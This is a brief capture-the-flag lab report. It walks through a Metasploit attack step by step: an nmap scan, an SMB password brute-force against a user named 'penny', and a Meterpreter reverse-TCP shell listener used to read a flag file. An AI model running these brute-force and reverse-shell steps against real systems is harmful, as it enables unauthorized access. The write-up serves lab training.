# CTF Mini-Lab Report

## 🎯 Objective
Perform a vulnerability scan and exploit a target to gain shell access using Metasploit Framework.

## 🛠️ Tools Used
- `nmap` for port scanning and service detection
- `msfconsole` for exploit and payload management
- `auxiliary/scanner/smb/smb_login` for SMB brute force
- `searchsploit` for checking public exploits

## 🔍 Methodology

### 1. Start Metasploit
```bash
msfconsole
```

### 2. Run Nmap
```bash
nmap -sV -p 8000 <target_ip>
```

### 3. SMB Brute Force Attack
```bash
search auxiliary/scanner/smb/smb_login
use <module_number>
set RHOSTS <target_ip>
set SMBUSER penny
set PASS_FILE /path/to/passwords.txt
run
```

### 4. Gain Shell via Exploit (if found)
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
run
```

### 5. Meterpreter Shell Commands
```bash
pwd        # show working directory
ls         # list files
cat flag.txt
```

## ✅ Findings
- Open SMB port allowed weak password authentication for user `penny`
- Exploit allowed remote code execution and retrieval of `flag.txt`

## 📘 Lessons Learned
- How to enumerate SMB shares and perform brute-force
- How to choose appropriate payloads and interact with meterpreter sessions